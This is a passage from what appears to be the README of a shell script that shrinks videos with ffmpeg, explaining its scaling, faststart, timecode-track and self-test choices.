**720p means 720 across the short side.** — Portrait video scales by width, landscape by height, so a phone clip does not get *upscaled* by a command meant to shrink it. The other dimension is computed with `-2`, which keeps it even — `yuv420p` cannot encode an odd dimension.

**`+faststart`.** — The index is moved to the front of the file so playback starts before the download finishes. On mobile data that is the whole difference.

**The timecode track is dropped.** — Broadcast delivery files carry a `tmcd` track that `-map` alone does not stop: the mp4 muxer re-creates it from stream metadata, and it lands in the output as an unknown data stream some mobile players refuse to open. `-write_tmcd 0` is what actually removes it.

**The printed command is the point.** — Copy it out and run the same encode without this script, or paste it somewhere as a starting point. The wrapper exists so the flags do not have to be remembered, not so they stay hidden.

### Self-Check

```bash
./test_video_shrink.sh
```

Covers the scaling maths, size parsing, and bitrate budget, then does one 2-second encode from a generated test pattern — the only way to prove the assembled argument array is valid ffmpeg and not merely well-formed strings.
